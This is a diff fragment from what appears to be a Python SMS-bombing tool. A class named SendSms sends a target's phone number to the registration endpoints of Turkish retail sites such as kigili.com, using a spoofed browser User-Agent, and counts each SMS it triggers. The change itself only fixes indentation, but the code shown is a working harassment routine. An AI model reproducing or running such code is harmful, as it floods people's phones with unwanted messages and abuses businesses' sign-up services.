@@ -767,20 +767,21 @@ class SendSms():
             print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> carrefoursa.com.tr")
 
 
-     #kigili.com
-     def Kigili(self):
-         try:
-             url = "https://www.kigili.com/users/registration/"
-             headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0", "Content-Type": "application/json"}
-             data = {"confirm": "true", "kvkk": "true", "phone": self.phone}
-             r = requests.post(url, headers=headers, json=data, timeout=6)
-             if r.status_code == 200:
-                 print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> kigili.com")
-                 self.adet += 1
-             else:
-                  raise
-         except:
-             print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> kigili.com")
+    #kigili.com
+    def Kigili(self):
+        try:
+            url = "https://www.kigili.com/users/registration/"
+            headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0", "Content-Type": "application/json"}
+            data = {"confirm": "true", "kvkk": "true", "phone": self.phone}
+            r = requests.post(url, headers=headers, json=data, timeout=6)
+            if r.status_code == 200:
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> kigili.com")
+                self.adet += 1
+            else:
+                raise
+        except:
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> kigili.com")
+
 
     #sakasu.com.tr
     def Sakasu(self):
